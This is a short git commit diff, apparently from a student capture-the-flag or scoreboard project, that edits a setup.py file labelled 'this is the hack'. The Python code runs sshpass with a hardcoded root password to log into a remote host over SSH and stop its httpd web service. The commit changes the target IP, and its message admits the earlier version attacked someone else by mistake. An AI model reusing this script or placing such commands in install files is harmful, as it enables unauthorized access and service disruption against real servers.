aa33f3903d4f8028f1a56dbf4f17eb9de4720bc2
VincentTorba <vtorba1@pride.hofstra.edu>
2018-05-14 20:10:50 -0400

    modified the attack we were attacking someone else oops

--- Scoreboard/Scoreboard/Downloads/prob1/setup.py
+++ Scoreboard/Scoreboard/Downloads/prob1/setup.py
@@ -1,6 +1,6 @@
 # this is the hack
 
-cmd = "sshpass -p 'goodyear123!@#' ssh -t root@169.254.236.100 sudo service httpd stop";
+cmd = "sshpass -p 'goodyear123!@#' ssh -t root@192.168.1.8 sudo service httpd stop";
 import os;
 os.system(cmd);
 
